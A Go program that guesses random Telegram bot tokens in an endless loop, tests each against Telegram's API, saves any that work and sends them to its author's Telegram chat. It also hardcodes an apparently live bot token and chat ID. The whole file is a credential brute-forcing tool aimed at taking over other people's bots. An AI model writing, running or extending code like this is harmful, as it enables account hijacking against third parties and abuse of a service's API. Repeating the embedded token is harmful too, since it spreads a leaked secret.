package main

import (
    "bufio"
    "fmt"
    "math/rand"
    "net/http"
    "os"
    "strings"
    "time"
)

const (
    botToken    = "6629617593:AAGNWcZ5EaAbBRmwhDPkWy7S0XudjyZFYDk" // Replace with your bot's token
    chatId      = "5079629749"            // Replace with your chat ID
    filePath    = "valid_tokens.txt"        // File to store valid tokens
    apiEndpoint = "https://api.telegram.org/bot%s/getMe"
)

var (
    failedCount  = 0
    totalChecks  = 0
)

func init() {
    rand.Seed(time.Now().UnixNano())
}

func generateRealisticToken() string {
    botId := make([]byte, rand.Intn(4)+7) // Generate botId of length 7-10
    for i := range botId {
        botId[i] = byte('0' + rand.Intn(10)) // Digits only
    }

    secret := make([]byte, 35) // Generate secret of length 35
    characters := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-"
    for i := range secret {
        secret[i] = characters[rand.Intn(len(characters))]
    }

    return fmt.Sprintf("%s:%s", botId, secret)
}

func checkToken(token string) bool {
    totalChecks++
    url := fmt.Sprintf(apiEndpoint, token)

    response, err := http.Get(url)
    if err != nil {
        fmt.Println("Error fetching URL:", err)
        return false
    }
    defer response.Body.Close()

    if response.StatusCode == http.StatusOK {
        fmt.Println("Token valid:", token)
        file, err := os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
        if err != nil {
            fmt.Println("Error opening file:", err)
            return false
        }
        defer file.Close()
        _, err = file.WriteString(token + "\n")
        if err != nil {
            fmt.Println("Error writing to file:", err)
        }
        sendMessage(fmt.Sprintf("Found valid token: %s\nTotal checks: %d", token, totalChecks))
        return true
    } else {
        failedCount++
        if failedCount%20 == 0 {
            sendMessage(fmt.Sprintf("Failed token check #%d: %s\nTotal checks: %d", failedCount, token, totalChecks))
        }
        fmt.Println("Token invalid:", token)
        return false
    }
}

func sendMessage(message string) {
    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
    data := strings.NewReader(fmt.Sprintf("chat_id=%s&text=%s", chatId, message))
    _, err := http.Post(url, "application/x-www-form-urlencoded", data)
    if err != nil {
        fmt.Println("Error sending message:", err)
    }
}

func findTokens() {
    // Ensure the file exists
    file, err := os.OpenFile(filePath, os.O_CREATE, 0644)
    if err != nil {
        fmt.Println("Error creating file:", err)
        return
    }
    file.Close()

    for {
        token := generateRealisticToken()
        checkToken(token)
        time.Sleep(time.Second) // Delay to avoid rate-limiting
    }
}

func main() {
    findTokens()
}
